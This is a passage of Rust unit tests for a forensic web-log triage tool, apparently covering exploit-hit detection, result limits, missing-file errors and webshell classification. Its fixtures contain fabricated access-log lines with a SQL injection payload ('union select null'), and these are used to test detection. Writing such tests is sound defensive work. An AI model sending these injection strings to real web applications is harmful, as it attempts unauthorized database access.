        let odd = "1.2.3.4 - - [not-a-date] \"GET /a?id=1'+union+select+null+--+ HTTP/1.1\" 200 5 \"-\" \"c\"\n";
        let out3 = run(&tmp_file("odd.log", odd));
        assert_eq!(out3.exploit_hits[0].timestamp_iso, "");
    }

    #[test]
    fn missing_artifact_is_a_typed_error() {
        let err = web_triage(&WebTriageInput {
            case_id: "case-web".into(),
            artifact_path: PathBuf::from("/no/such/access.log"),
            limit: None,
        })
        .unwrap_err();
        assert!(matches!(err, WebTriageError::NotFound(_)), "{err:?}");
    }

    #[test]
    fn limit_caps_returned_hits_but_not_the_count() {
        let mut body = String::new();
        for i in 0..50 {
            use std::fmt::Write as _;
            let _ = writeln!(
                body,
                "10.0.0.{i} - - [02/Sep/2015:04:05:00 -0700] \"GET /a?id=1%27+union+select+null+--+ HTTP/1.1\" 200 5 \"-\" \"curl/7.0\""
            );
        }
        let path = tmp_file("big.log", &body);
        let out = web_triage(&WebTriageInput {
            case_id: "case-web".into(),
            artifact_path: path,
            limit: Some(10),
        })
        .unwrap();
        assert_eq!(out.exploit_hits.len(), 10);
        assert_eq!(out.exploit_hit_count, 50);
        assert!(out.truncated);
    }

    #[test]
    fn a_non_web_text_file_classifies_as_unknown_and_yields_no_hits() {
        let path = tmp_file("notes.txt", "just some notes\nnothing web here\n");
        let out = run(&path);
        assert_eq!(out.artifact_kind, "unknown");
        assert!(out.exploit_hits.is_empty());
        assert!(out.script_hits.is_empty());
        assert!(!out.is_probable_webshell);
    }
}
